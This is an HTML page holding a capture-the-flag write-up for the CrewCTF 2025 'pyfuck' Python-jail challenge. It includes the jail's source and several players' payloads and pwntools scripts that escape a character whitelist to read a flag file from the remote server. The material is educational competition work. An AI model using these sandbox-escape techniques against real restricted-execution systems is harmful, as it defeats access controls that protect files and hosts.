@@ -1,0 +1,725 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/misc/pyjail/crewctf-2025-pyfuck.html">
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>CrewCTF 2025 pyfuck - CTF Writeups by @jiegec</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../../css/brands.min.css" rel="stylesheet">
+        <link href="../../css/solid.min.css" rel="stylesheet">
+        <link href="../../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#crewctf-2025-pyfuck" class="nav-link">CrewCTF 2025 pyfuck</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#writeups-on-discord" class="nav-link">Writeups on Discord</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#reproduction-of-writeups-on-discord" class="nav-link">Reproduction of writeups on discord</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#method-2-combine-line-with-range38" class="nav-link">Method 2. Combine line with range(38)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="crewctf-2025-pyfuck">CrewCTF 2025 pyfuck</h1>
+<pre class="highlight"><code>Do you really know python?
+
+Resource: https://pywtf.seall.dev/
+
+ncat --ssl pyfck.chal.crewc.tf 1337
+
+author : sealldev &amp; KabirAcharya</code></pre>
+<p>Attachment:</p>
+<pre class="highlight"><code class="language-python">#!/usr/bin/python3
+
+"""
+The flag is stored at 'Flag.txt' across multiple lines e.g. c\nr\ne\nw\n{\n...
+"""
+
+allowed_builtins = {
+    'next': next,
+    'chr': chr,
+    'ord': ord,
+    'max': max,
+    'min': min,
+    'bin': bin,
+    'int': int,
+    'len': len,
+    'str': str,
+    'set': set,
+    'hex': hex,
+    'print': print,
+    'range': range,
+    'open': open
+}
+
+whitelist = "abcdefghijklmnopqrstuvwxyz()+"
+
+security_check = lambda s: any(c not in whitelist for c in s) or s.count('+') &gt; 12 or len(s) &gt; 340 or 'print' in s
+
+print('Welcome to pyfuck &lt;3')
+print('Good luck!')
+print('- sealldev &amp; KabirAcharya')
+while True:
+    cmd = input("Input: ")
+    if security_check(cmd):
+        print("No dice!")
+    else:
+        try:
+            exec("print("+cmd+")", {'__builtins__': allowed_builtins}, {})
+        except:
+            print("No dice!")</code></pre>
+<p>Requirement:</p>
+<ol>
+<li>Only alphabetic characters, parentheses and plus sign: use plus sign to construct string, generator syntax and function call</li>
+<li>Limited builtins and count of <code>+</code>: search for a short combination to create the intended string</li>
+</ol>
+<h2 id="writeups-on-discord">Writeups on Discord</h2>
+<p>Writeup by @oh_word on Discord:</p>
+<pre class="highlight"><code class="language-python">set(
+ x+next(y)
+ for(y)in(set(open(&lt;combination to get /Flag.txt string&gt;)for(x)in(str(int()))))
+ for(x)in(next(open(int())))
+)
+
+You can use the generator to store the opened flag file in a var, then using stdin you can send 38 bytes in a specific order and sort them from the set that gets returned</code></pre>
+<p>Writeup by @nikost on Discord:</p>
+<pre class="highlight"><code class="language-python">set(next((str(i)+next(f)for(i)in(range(38)))for(f)in(open("Flag.txt")for(x)in(range(1)))))</code></pre>
+<p>Writeup by @Leonardo on Discord:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+import itertools
+
+
+def decrease(x, n=1):
+    for _ in range(n):
+        x = f"max(range({x}))"
+    return x
+
+
+def find_combinations(n, target, nums):
+    return [comb for comb in itertools.combinations_with_replacement(nums, n) if sum(comb) == target]
+
+
+def set_value(value, x):
+    if type(value) is int:
+        if value not in numbers or len(x) &lt; len(numbers[value]):
+            numbers[value] = x
+        char = chr(value)
+        chr_expr = f"chr({x})"
+        if char not in characters or len(chr_expr) &lt; len(characters[char]):
+            characters[char] = chr_expr
+    elif type(value) is str and len(value) == 1:
+        if value not in characters or len(x) &lt; len(characters[value]):
+            characters[value] = x
+        ord_expr = f"ord({x})"
+        o = ord(value)
+        if o not in numbers or len(ord_expr) &lt; len(numbers[o]):
+            numbers[o] = ord_expr
+
+
+allowed_builtins = {
+    "next": next,
+    "chr": chr,
+    "ord": ord,
+    "max": max,
+    "min": min,
+    "bin": bin,
+    "int": int,
+    "len": len,
+    "str": str,
+    "set": set,
+    "hex": hex,
+    # "print": print,
+    "range": range,
+    "open": open,
+}
+
+characters = {}
+numbers = {}
+
+exprs = [
+    *allowed_builtins,
+    *[fn + "()" for fn in allowed_builtins],
+    "range(int())",
+    "bin(int())",
+    "int(not())",
+    "()",
+    "()in()",
+    "not()",
+]
+
+for expr in exprs:
+    for value in [expr, f"str({expr})"]:
+        for fn in [False, "len", "min", "max"]:
+            x = f"{fn}({value})" if fn else value
+            try:
+                res = eval(x)
+                set_value(res, x)
+            except:
+                pass
+
+for value in list(numbers.values()):
+    exprs = [f"len(bin({value}))", f"len(hex({value}))"]
+    for x in exprs:
+        res = eval(x)
+        set_value(res, x)
+
+for i in range(1, 10):
+    if i in numbers:
+        x = f"str({numbers[i]})"
+        res = eval(x)
+        set_value(res, x)
+
+
+for n in list(numbers):
+    for i in range(1, 3):
+        if n - i &gt; 0:
+            x = decrease(numbers[n], i)
+            set_value(n - i, x)
+
+nums = sorted(numbers)
+
+for i in range(128):
+    combs = find_combinations(2, i, nums)
+    for comb in combs:
+        x = "+".join(numbers[c] for c in comb)
+        set_value(i, x)
+
+
+
+
+
+flag_file = "+".join(characters[c] for c in "Flag.txt")
+
+payload = f"set((next(f) + str(i)) for (f) in (open({flag_file}) for (i) in (str(int()))) for (i) in (range({numbers[38]})))".replace(" ", "")
+print()
+print(len(payload), payload.count("+"))
+print(payload)
+
+r = remote("pyfck.chal.crewc.tf", 1337, ssl=True)
+
+r.recvuntil(b"Input: ")
+r.sendline(payload.encode())
+l = r.recvline().strip().decode()
+data = pwnlib.util.safeeval.const(l)
+
+data = [x.split("\n") if "\n" in x else [x[0], x[1:]] for x in data]
+data = [[int(i), x] for x, i in data]
+data.sort()
+flag = "".join(x for i, x in data[1:])
+print(flag)</code></pre>
+<p>Writeup by @Muhammed.  on Discord:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+import json
+
+numbers = {
+    1: 'not()',
+    2: '(not())+(not())',
+    3: 'len(hex(int()))',
+    4: 'len(str(not()))',
+    5: 'len(str(set()))',
+    6: 'len(bin(len(str(int))))',
+    7: 'len(bin(len(str(open))))',
+    8: 'len(str(not()))+len(str(not()))',
+    9: 'len(str(not()))+len(str(not(not())))',
+    10: 'len(str(not(not()))+str(not(not())))',
+    11: 'len(str(range(int())))',
+    12: 'len(str(range(ord(str(int())))))',
+    13: 'len(str(set))',
+    14: 'len(str(set))+int(not())',
+    15: 'len(str(range))',
+    16: 'len(str(range))+int(not())',
+    17: 'len(set(str(hex)))+int(not())',
+    18: 'len(str(()in())+str(set))',
+    19: 'len(str(not())+str(range))',
+    20: 'len(str(()in())+str(range))',
+    21: 'len(set(str(hex)))+len(str(()in()))',
+    22: 'len(set(str(int)))+len(set(str(int)))',
+    23: 'len(str(len))',
+    24: 'len(str(open))',
+    25: 'len(str(open))+(not())',
+    26: 'len(str(len))+len(hex(int()))',
+    27: 'len(str(len))+len(str(not()))',
+    28: 'len(str(()in())+str(bin))',
+    29: 'len(str(()in())+str(open))',
+    30: 'len(str(range))+len(str(range))',
+    31: 'len(str(range))+len(set(str(hex)))',
+    32: 'ord(min(str(chr)))',
+    33: 'ord(min(str(chr)))+(not())',
+    34: 'len(str(ord)+str(range(not())))',
+    35: 'len(str(open)+str(range(not())))',
+    36: 'len(str(ord))+len(str(set))',
+    37: 'len(str(open))+len(str(set))',
+}
+
+letters = {
+    "F": 'min(str(()in()))',
+    'l': 'chr(len(str(open))+ord(min(str(not()))))',
+    'a': 'chr(ord(str(int()))+ord(str(int(not()))))',
+    'g': 'chr(len(str(ord))+len(str(set(str(max)))))',
+    '.': 'chr(len(str(len))+len(str(len)))',
+    't': 'max(str(int))',
+    'x': 'max(str(hex))'
+}
+
+flag = ""
+payload = 'set(next(i)if(set(next(i)for(n)in(range(NUMBERS))))else()for(i)in(open(PATH)for(i)in(str(chr))))'
+PATH = letters['F']+"+"+letters['l']+"+"+letters['a']+"+"+letters['g']+"+"+letters['.']+"+"+letters['t']+"+"+letters['x']+"+"+letters['t']
+
+r = remote("pyfck.chal.crewc.tf", 1337, ssl=True)
+
+for i in range(4):
+    d = r.recvline()
+
+for line in range(1,38):
+    craft = payload.replace("PATH", PATH)
+    craft = craft.replace("NUMBERS", numbers[line]).encode()
+    r.sendline(craft)
+    flag += r.recvline().decode().split()[1][2]
+
+print("[+] FLAG:", flag)</code></pre>
+<h2 id="reproduction-of-writeups-on-discord">Reproduction of writeups on discord</h2>
+<p>First, we need to find a combination that evaluates to <code>Flag.txt</code>. Based on code generated by Claude, python code is written to find a solution:</p>
+<pre class="highlight"><code class="language-python">from itertools import combinations_with_replacement
+from collections import defaultdict
+
+# atomic expressions we can use (names are the strings you can type)
+atoms = {
+    # 1
+    "not()": int(not ()),
+    # 3
+    "len(str(bin(int())))": len(str(bin(int()))),
+    # 4
+    "len(str(not()))": len(str(not ())),
+    # 5
+    "len(str(set()))": len(str(set())),
+    # 6
+    "len(bin(len(str(int))))": len(bin(len(str(int)))),
+    # 7
+    "len(bin(len(str(open))))": len(bin(len(str(open)))),
+    # 8
+    "len(bin(len(str(set(str(range(int())))))))": len(
+        bin(len(str(set(str(range(int()))))))
+    ),
+    # 11
+    "len(str(range(int())))": len(str(range(int()))),
+    # 13
+    "len(str(int))": len(str(int)),
+    # 15
+    "len(str(range))": len(str(range)),
+    # 23
+    "len(str(chr))": len(str(chr)),
+    # 24
+    "len(str(open))": len(str(open)),
+    # 25
+    "len(str(set(str(()in()))))": len(str(set(str(() in ())))),
+    # 32
+    "ord(min(str(open)))": ord(min(str(open))),
+    # 40
+    "ord(min(str(set())))": ord(min(str(set()))),
+    # 48
+    "ord(str(int()))": ord(str(int())),
+    # 49
+    "ord(str(int(not())))": ord(str(int(not ()))),
+    # 50
+    "len(str(set(str(range(int())))))": len(str(set(str(range(int()))))),
+    # 65
+    "len(str(set(str(set(str(range(int())))))))": len(
+        str(set(str(set(str(range(int()))))))
+    ),
+    # 70
+    "ord(min(str(()in())))": ord(min(str(() in ()))),
+    # 75
+    "len(str(set(str(open))))": len(str(set(str(open)))),
+    # 80
+    "len(str(set(str(max))))": len(str(set(str(max)))),
+    # 84
+    "ord(min(str(not())))": ord(min(str(not ()))),
+    # 97
+    "max(range(ord(max(bin(int())))))": max(range(ord(max(bin(int()))))),
+    # 98
+    "ord(max(bin(int())))": ord(max(bin(int()))),
+    # 100
+    "len(str(set(str(set(str(set(str(ord))))))))": len(
+        str(set(str(set(str(set(str(ord)))))))
+    ),
+    # 114
+    "ord(max(str(range(int()))))": ord(max(str(range(int())))),
+    # 115
+    "ord(max(str(range)))": ord(max(str(range))),
+    # 115
+    "ord(max(str(()in())))": ord(max(str(() in ()))),
+    # 116
+    "ord(max(str(int)))": ord(max(str(int))),
+    # 117
+    "ord(max(str(not()in())))": ord(max(str(not () in ()))),
+    # 120
+    "ord(max(str(hex)))": ord(max(str(hex))),
+}
+
+print("Atomic values (name -&gt; value):")
+for k, v in atoms.items():
+    print(f"{k} -&gt; {v}")
+
+# targets: ascii codes of "Flag.txt"
+targets = [ord(c) for c in "Flag.txt"]
+print("Targets:", targets)
+
+# convert to list of (expr, value) for easier usage
+atom_list = list(atoms.items())
+values = [v for (_, v) in atom_list]
+
+# For each target, find combinations of up to N summands (we will limit to low N)
+max_summands_per_target = 3  # increase if you want to search longer
+combos_for_target = {}
+for t in targets:
+    combos = []
+    for r in range(1, max_summands_per_target + 1):
+        for combo in combinations_with_replacement(range(len(values)), r):
+            s = sum(values[i] for i in combo)
+            if s == t:
+                combos.append(combo)
+    combos_for_target[t] = combos
+    print(
+        f"Target {t} found {len(combos)} combinations (limited search): {['+'.join([str(values[i]) for i in combo]) for combo in combos]}"
+    )
+
+def find(limit):
+    # Now attempt to pick one combination for each target such that
+    # total number of atomic summands across all targets &lt;= limit
+    solutions = []
+
+
+    def dfs(i, current_terms, selection):
+        # i: index in targets
+        if i == len(targets):
+            if current_terms &lt;= limit:
+                solutions.append(list(selection))
+            return
+        for combo in combos_for_target.get(targets[i], []):
+            new_terms = current_terms + len(combo)
+            if new_terms &gt; limit:
+                continue
+            selection.append(combo)
+            dfs(i + 1, new_terms, selection)
+            selection.pop()
+
+
+    dfs(0, 0, [])
+
+    if not solutions:
+        print(
+            "No solution found with current atom set and limits (likely infeasible under +&lt;=12)."
+        )
+    else:
+        print("Found solutions! Building payload...")
+
+        # build a textual payload from solutions
+        result = []
+        for sol in solutions:
+            # helper to convert combo indices to expression sum
+            def combo_to_expr(combo):
+                parts = [atom_list[i][0] for i in combo]
+                return "+".join(parts)
+
+            chr_parts = []
+            for combo in sol:
+                expr = combo_to_expr(combo)
+                # simplify chr(ord(x)) -&gt; x
+                if expr.startswith("ord(") and expr.endswith(")") and "+" not in expr:
+                    chr_parts.append(expr.removeprefix("ord(").removesuffix(")"))
+                else:
+                    chr_parts.append(f"chr({expr})")
+            payload = "+".join(chr_parts)
+            # full expression to send to the challenge
+            final = f"open({payload})"
+            # count pluses
+            plus_count = final.count("+")
+            result.append((final, plus_count, len(final)))
+
+        final, plus_count, len_final = min(result, key=lambda x: x[2])
+        print("Payload:", final)
+        print("Plus count:", plus_count)
+        print("Length:", len_final)
+
+find(11)</code></pre>
+<p>Output:</p>
+<pre class="highlight"><code>Found solutions! Building payload...
+Payload: open(min(str(()in()))+chr(len(str(open))+ord(min(str(not()))))+chr(max(range(ord(max(bin(int()))))))+chr(len(str(set()))+ord(max(bin(int()))))+chr(len(str(chr))+len(str(chr)))+max(str(int))+max(str(hex))+max(str(int)))
+Plus count: 10
+Length: 218</code></pre>
+<p>Using 10 <code>+</code> allows us to use two more in the rest part. Each character is computed from:</p>
+<ol>
+<li><code>F</code>: <code>min(str(()in()))</code></li>
+<li><code>l</code>: <code>chr(len(str(open))+ord(min(str(not()))))</code></li>
+<li><code>a</code>: <code>chr(max(range(ord(max(bin(int()))))))</code></li>
+<li><code>g</code>: <code>chr(len(str(set()))+ord(max(bin(int()))))</code></li>
+<li><code>.</code>: <code>chr(len(str(chr))+len(str(chr)))</code></li>
+<li><code>t</code>: <code>max(str(int))</code></li>
+<li><code>x</code>: <code>max(str(hex))</code></li>
+</ol>
+<p>Now the next thing is to extract the result from file. If the flag file contains flag in its first line, we are done. However, the flag is separated in many lines, and the only thing that can handle iterator is <code>set()</code>, which makes it hard to recover the flag.</p>
+<h3 id="method-1-combine-line-with-text-read-from-stdin">Method 1. Combine line with text read from stdin</h3>
+<p>The first method is from @oh_word on Discord. The idea is to combine the line of the flag file with text read from stdin, so that we can recover the order and avoid deduplication:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+import string
+
+context(log_level="debug")
+
+# send 38(29 bytes locally) bytes (including newline) to distinguish lines
+
+# length = 29
+# p = process(["python3", "main.py"])
+length = 38
+p = process("ncat --ssl pyfck.chal.crewc.tf 1337".split())
+
+p.recvuntil(b"Input: ")
+flag_open = "open(min(str(()in()))+chr(len(str(open))+ord(min(str(not()))))+chr(max(range(ord(max(bin(int()))))))+chr(len(str(set()))+ord(max(bin(int()))))+chr(len(str(chr))+len(str(chr)))+max(str(int))+max(str(hex))+max(str(int)))"
+p.sendline(
+    f"""set(
+           x + next(y)
+           for (y) in (set({flag_open} for (x) in (str(int()))))
+           for (x) in (next(open(int()))))""".replace(
+        " ", ""
+    )
+    .replace("\n", "")
+    .encode()
+)
+sent = string.ascii_letters[: length - 1]
+p.sendline(sent.encode())
+# recover
+res = p.recvline()
+res = eval(res.decode())
+for ch in sent[1:] + "\n":
+    for x in res:
+        if x.startswith(ch):
+            print(x[1], end="")</code></pre>
+<p>Note that the number of bytes sent must be accurate, otherwise it will fail with StopIteration error or the result will be truncated. We can increase the length until it fails.</p>
+<p>There is a little trick that maintains the file object and allow you to call <code>next</code> on it: <code>for (y) in (set(generator))</code> so that y becomes the only element computed by the generator.</p>
+<p>Flag: <code>crew{mult1l1n3_fl@gs_4r3_4_r34l_p41n}</code>.</p>
+<h1 id="method-2-combine-line-with-range38">Method 2. Combine line with range(38)</h1>
+<p>Alternatively, instead of combining with text read from stdin, we can combine it with range(38), which should do the similar thing. But it requires more length, so a shorter way to find <code>Flag.txt</code> is required. The rest part is similar. The method is used by @nikost, @Leonardo and @Muhammed. on Discord.</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+import string
+
+context(log_level="debug")
+
+# flag_len = "len(str(set()))+len(str(open))"  # 5 + 24 = 29
+# p = process(["python3", "main.py"])
+flag_len = "len(str(range))+len(str(chr))"  # 15 + 23 = 38
+p = process("ncat --ssl pyfck.chal.crewc.tf 1337".split())
+
+p.recvuntil(b"Input: ")
+flag_open = "open(min(str(()in()))+chr(len(str(open))+ord(min(str(not()))))+chr(max(range(ord(max(bin(int()))))))+chr(len(str(set()))+ord(max(bin(int()))))+chr(len(str(chr))+len(str(chr)))+max(str(int))+max(str(hex))+max(str(int)))"
+p.sendline(
+    f"""set(
+           str(x) + next(y)
+           for (y) in (set({flag_open} for (x) in (str(int()))))
+           for (x) in (range({flag_len})))""".replace(
+        " ", ""
+    )
+    .replace("\n", "")
+    .encode()
+)
+# recover
+res = p.recvline()
+res = eval(res.decode())
+for ch in [str(x) for x in range(38)][1:]:
+    for x in res:
+        if x.startswith(ch) and len(ch) + 1 &lt; len(x) and x[len(ch) + 1] == "\n":
+            print(x[len(ch) : len(ch) + 1], end="")</code></pre>
+<p>Flag: <code>crew{mult1l1n3_fl@gs_4r3_4_r34l_p41n}</code>.</p></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js"></script>
+        <script src="../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
